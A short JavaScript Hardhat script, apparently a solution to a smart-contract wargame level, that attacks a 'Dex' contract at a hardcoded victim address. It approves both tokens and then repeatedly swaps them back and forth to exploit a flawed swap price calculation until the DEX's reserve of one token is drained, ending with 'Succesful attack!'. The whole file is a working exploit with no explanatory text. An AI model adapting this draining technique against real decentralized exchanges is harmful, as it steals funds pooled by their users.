
const { ethers } = require("hardhat");

var signer, dex, token1, token2, token1swapAmount, token2swapAmount, dexToken1balance, dexToken2balance;
const victimAddress = '0xD8B0013787c03E4a50A528365c068d53B0fA9F37';

async function main() {

  const Dex = await ethers.getContractFactory("Dex");
  dex = Dex.attach(victimAddress);

  const ERC20 = await ethers.getContractFactory("ERC20");
  token1 = ERC20.attach(await dex.token1());
  token2 = ERC20.attach(await dex.token2());

  signer = (await ethers.getSigners())[0];

  console.log("Approving token 1..");
  const approve1tx = await token1.approve(victimAddress, 500);
  await approve1tx.wait();
  console.log("Token 1 approved");

  console.log("Approving token 2..");
  const approve2tx = await token2.approve(victimAddress, 500);
  await approve2tx.wait();
  console.log("Token 2 approved");

  await printBalances();

  while (dexToken1balance != 0 && dexToken2balance != 0) {

    if(token1swapAmount > dexToken1balance){
      token1swapAmount = dexToken1balance;
    }

    console.log(`Swapping ${token1swapAmount} of token1..`);
    const tx = await dex.swap(token1.address, token2.address, token1swapAmount);
    await tx.wait();

    await printBalances();    

    if(token2swapAmount > dexToken2balance){
      token2swapAmount = dexToken2balance;
    }

    console.log(`Swapping ${token2swapAmount} of token2..`);
    const tx2 = await dex.swap(token2.address, token1.address, token2swapAmount);
    await tx2.wait();

    await printBalances();
  }

  console.log("Succesful attack!");
}

async function printBalances(){
  token1swapAmount = Number(await token1.balanceOf(signer.address));
  token2swapAmount = Number(await token2.balanceOf(signer.address));
  dexToken1balance = Number(await dex.balanceOf(token1.address, victimAddress));
  dexToken2balance = Number(await dex.balanceOf(token2.address, victimAddress));

  console.log("Dex token1 balance:", dexToken1balance);
  console.log("Dex token2 balance:", dexToken2balance);
  console.log(`Balance of token1:`, token1swapAmount);
  console.log(`Balance of token2:`, token2swapAmount);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
